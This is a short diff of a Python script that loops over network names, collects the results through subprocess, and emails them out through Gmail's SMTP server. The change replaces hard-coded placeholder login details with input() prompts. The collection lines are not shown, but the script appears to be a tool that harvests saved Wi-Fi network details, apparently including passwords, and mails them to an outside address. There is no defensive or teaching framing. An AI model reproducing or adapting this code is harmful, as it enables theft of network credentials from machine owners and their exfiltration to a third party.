@@ -3,6 +3,9 @@ import subprocess
 import smtplib
 import re
 
+email = input("enter your email >> ")
+password = input("enter your password >> ")
+
 def send_mail(email, password, message):
 	server = smtplib.SMTP("smtp.gmail.com", 587)
 	server.starttls()
@@ -24,6 +27,6 @@ for network_name in network_names_list:
 	result = result + current_result
 
 
-send_mail("yourid@gmail.com", "yourpass", result)
+send_mail(email, password, result)
 
 
